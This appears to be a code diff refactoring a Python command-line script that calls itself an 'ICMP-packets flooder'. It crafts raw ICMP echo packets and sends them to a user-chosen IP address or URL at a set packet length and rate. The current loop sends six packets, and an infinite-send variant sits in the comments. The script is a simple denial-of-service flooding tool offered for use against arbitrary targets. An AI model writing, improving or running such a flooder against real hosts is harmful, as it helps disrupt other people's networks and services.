@@ -8,7 +8,7 @@ import socket
 import random
 import argparse
 
-class Flooder():
+class Flooder:
     # Check data, calculated from the ICMP header and data
     def checksum(self, msg):
         s = 0
@@ -18,9 +18,10 @@ class Flooder():
         return socket.htons(~s & 0xffff)
 
     # Construct the header and data of packet and pack it
-    def construct_packet(self, length, freq):
+    def construct_packet(self, length):
         header = struct.pack("bbHHh", 8, 0, 0, 1, 1)
-        data = struct.pack("d", freq) + ((length - 50) * 'Q')
+        data = (length - 50) * 'Q'
+        data = struct.pack("d", time.time()) + data.encode('ascii')
         header = struct.pack("bbHHh", 8, 0, socket.htons(self.checksum(header + data)), 1, 1)
         return header + data
 
@@ -29,71 +30,68 @@ class Flooder():
     def create_socket(self, ip, port, length, freq):  
         sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
         
-        for i in range(0, 6):
-            packet = self.construct_packet(length, freq)
-            sock.sendto(packet, (ip, port))
-            time.sleep(freq * 10)
+        # This loop if for sending packet specified times
+        #for i in range(0, 6):
+        #    packet = self.construct_packet(length, freq)
+        #    sock.sendto(packet, (ip, port))
+        #    time.sleep(freq * 10)
 
         # This loop is for sending packet to target infinitely
-        #while(True):
-        #    packet = construct_packet(int(args.l), float(args.f))
-        #    sock.sendto(packet, (ip_addr, int(args.p)))
-        #    sock.settimeout(float(args.f))
+        for i in range(0, 6):
+        #while(KeyboardInterrupt):
+            packet = self.construct_packet(length)
+            sock.sendto(packet, (ip, port))
+            time.sleep(freq)
         
         sock.close()
         
     def main(self, argv):
-        parser = argparse.ArgumentParser(description="ICMP-packets flooder")
-        parser.add_argument('-i', help='Enter ip address of destination')
-        parser.add_argument('-u', help='Enter url address')
-        parser.add_argument('-p', help='Specify port', default=69)
-        parser.add_argument('-l', help='Specify packet length', default=60)
-        parser.add_argument('-f', help='Specify value of frequence to sent packet', default=0.1)
+        parser = argparse.ArgumentParser(description="ICMP-packets flooder. This programm creates and" + 
+                " sends the ICMP-packets to target IP-address/URL address. You can change port number," +
+                " length of packet and frequence of sending.")
+        parser.add_argument('-i', help='Enter target ip address of destination', metavar='', type=str)
+        parser.add_argument('-u', help='Enter target url address', metavar='', type=str)
+        parser.add_argument('-p', help='Specify port number', metavar='', default=69, type=int)
+        parser.add_argument('-l', help='Specify packet length', metavar='', default=60, type =int)
+        parser.add_argument('-f', help='Specify value of frequence to send packet', metavar='', default=0.01, type=float)
         args = parser.parse_args()
 
         # Try to get ip address of destination (by url too)
-        try:
-            if args.u:
-                url = args.u
-                ip_addr = socket.gethostbyname(url)
-                print("Specific Url: ", url)
-            if args.i:
-                ip_addr = args.i
-                print("Specific IP-Address: ", ip_addr)
-        except SystemError:
-            print("Enter Url or IP-address")
+        if args.u:
+            url = args.u
+            ip_addr = socket.gethostbyname(url)
+            print("Specific Url: ", url)
+        if args.i:
+            ip_addr = args.i
+            print("Specific IP-Address: ", ip_addr)
+        if len(ip_addr) < 7:
+            print("IP-Address is not correct")
+            sys.exit()
         
-        # Try to get port number to send packet      
-        try:
-            if int(args.p) > 0 and int(args.p) < 65530:
-                print("Specific port: ", int(args.p))
-            elif int(args.p) == 69:
-                print("Default port: ", int(args.p))
-            else:
-                print("No valid port number")
-        except TypeError:
-            print("No valid type for port number")
+        # Check for correct port number to send packet      
+        if int(args.p) > 0 and int(args.p) < 65530:
+            print("Specific port: ", int(args.p))
+        elif int(args.p) == 69:
+            print("Default port: ", int(args.p))
+        else:
+            print("No valid port number")
+            sys.exit()
             
         # Check for correct value of lenhgth of packet
-        try:
-            if int(args.l) < 51:
-                print("Is too few length")
-            elif int(args.l) == 60:
-                print("Default length: ", int(args.l))
-            else:
-                print("Specific length of packet: ", int(args.l))
-        except TypeError:
-            print("No valid length")
+        if int(args.l) < 51:
+            print("Is too few length")
+            sys.exit()
+        elif int(args.l) == 60:
+            print("Default length: ", int(args.l))
+        else:
+            print("Specific length of packet: ", int(args.l))
 
         # Check for correct value of frequency to send packets
-        try:
-            if float(args.f) == 0.1:
-                print("Default times: ", float(args.f))
-            else:
-                print("Specific count: ", float(args.f))
-        except TypeError:
-            print("No valid count")
-            
+        if float(args.f) == 0.1:
+            print("Default times: ", float(args.f))
+        else:
+            print("Specific count: ", float(args.f))
+
         self.create_socket(ip_addr, int(args.p), int(args.l), float(args.f))
 
 if __name__ == "__main__":
